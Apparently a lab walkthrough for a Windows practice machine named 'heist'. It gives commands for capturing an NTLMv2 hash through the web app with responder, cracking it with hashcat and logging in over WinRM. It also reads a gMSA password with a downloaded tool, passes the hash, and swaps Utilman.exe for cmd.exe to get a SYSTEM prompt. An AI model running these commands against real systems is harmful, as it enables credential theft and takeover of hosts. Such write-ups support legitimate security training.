## Takeaway
## Metadata
- Port `8080` is running an web application allowing browsing of arbitrary URL.![[Pasted image 20240328120237.png]]
	- Run `sudo responder -I tun0 -A` and enter URL `http://192.168.45.189/test` to receive `Net-NTLMv2` hash of the user `enox`.![[Pasted image 20240328120353.png]]
	- Run `hashcat -M 5600 enox.hash /usr/share/wordlists/rockyou.txt --force` to retrieve credential pair as `enox:california`.![[Pasted image 20240328120721.png]]
	- Running `netexec winrm 192.168.193.165 -u enox -p california` has access to the host through `winrm`.![[Pasted image 20240328124234.png]]
- Enumerating as `enox` can locate `todo.txt` at `C:\Users\enox\Desktop` saying there is a `Group Managed Service Account(gmsa)` enabled.![[Pasted image 20240328134516.png]]
- Run `bloodhound` will identify that the `gmsa` account is called `svc_apache$` which is also a member of `REMOTE MANAGEMENT USERS`.![[Pasted image 20240328134641.png]]
	- Further enumeration will identify the user `enox` is member of `WEB ADMINS`  which is granted `ReadGMSAPassword` privilege.![[Pasted image 20240328134828.png]]
	- Upload `GMSAPasswordReader.exe` from `https://github.com/CsEnox/tools/raw/main/GMSAPasswordReader.exe` using `winrm`. Run `.\GMSAPasswordReader.exe   --AccountName svc_apache$`  will give us the hash of the account.![[Pasted image 20240328140633.png]]
- Enumerating as `heist\svc_apache$` will identify that `SeRestorePrivilege` is enabled which basically grants us permission for **write access** to any system file, irrespective of the file's Access Control List (ACL). ![[Pasted image 20240328142449.png]]
# Exploitation
## Shell as enox
- Run `evil-winrm -i 192.168.193.165 -u enox -p california` to get a session as `heist\enox`.
## Shell as svc_apache$
- Run `evil-winrm -i 192.168.193.165 -u "svc_apache$" -H 4B3F0BF258E6C099A7B800EC37B2D456` to get a session as `heist\svc_apache$`.
# PrivEsc
- With `SeRestorePrivilege` enable, run `ren C:\Windows\System32\Utilman.exe C:\Windows\System32\Utilman.exe.old` and `ren C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe`.
	- Run `rdesktop 192.168.193.165` and hit `Windows key + u` to get a command prompt session under `nt authority/system`